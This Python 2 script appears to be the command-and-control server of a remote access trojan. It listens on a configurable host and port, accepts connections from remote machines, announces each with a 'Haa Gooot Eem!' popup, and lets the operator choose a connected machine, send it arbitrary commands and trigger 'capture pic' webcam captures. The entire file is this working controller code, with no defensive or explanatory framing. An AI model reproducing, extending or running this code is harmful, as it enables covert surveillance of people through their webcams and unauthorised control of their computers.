import socket               # Import socket module
import thread
import time
import tkMessageBox

c = []
user_con = 0
sel = 0
addr = 0


hostid = "" #Put host IP
openport = 0 #Put Open Port here

def wait_connection():
   global c
   global user_con
   global sel
   global addr
   while True: #Waiting for connection C:
         print "Waiting for connection from client: "
         c.append(user_con)
         c[user_con], addr = sock.accept()  #sock.accept used to accept client , c is the refrence object of client connected  and consider addr as syntax
         #addr gives ip
         user_con +=1
         tkMessageBox.showinfo(title="Haa Gooot Eem!", message="User "+str((user_con-1))+" connected"+"\n"+str(addr)) #Gui Pop Message
         
         
         
         break
def enter_user():
      global c
      global user_con
      global sel
      while True:
            try:
               print "Users connected: ",user_con
               sel = int(raw_input("Enter the user number you want to connect to: "))
               if sel < user_con:
                  break
               else:
                  print "Invalid"
               
            except:
               print "Invalid type in number not string: "
def interf():
     global c
     global user_con
     global sel
     while True:
        
         
         # Establish connection with client.
         r = raw_input("Enter what you want to send: ")
         if r=='capture pic':
            c[sel].send(r)
            try:
               aa = int(raw_input("Enter the source for cam: "))
            except Exception as e:
               print e
            c[sel].send(str(aa))
         if r == 'reset':
            break
         
         if r == 'exit':
            c[sel].close()
            exit()
         if c[sel].recv(1026) == 'closer':
            print "Client has disconnected"
            c[sel].close()
            break
         if r == 'exit_connection':
            break
            
        
         c[sel].send(r)

try: #Main Program
   sock = socket.socket() # Create socket object
   sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1) #To help reuse socket

   host = hostid               # Get local machine name
   port = openport# Reserve a port for your service.

   sock.bind((host, port)) #Setting socket to host with port
   # Bind to the port

   sock.listen(5)                 # Now wait for client connection.
   thread.start_new_thread(wait_connection,()) #Starting Thread to keep accsepting connections.
   time.sleep(1) #To give a delay between print staments
   while True: # Main loop for accsepting connections
         
         enter_user()
         interf()
      
         
         
    
                         # Close the connection
except Exception as e:
   print e
finally:
   c[sel].close()
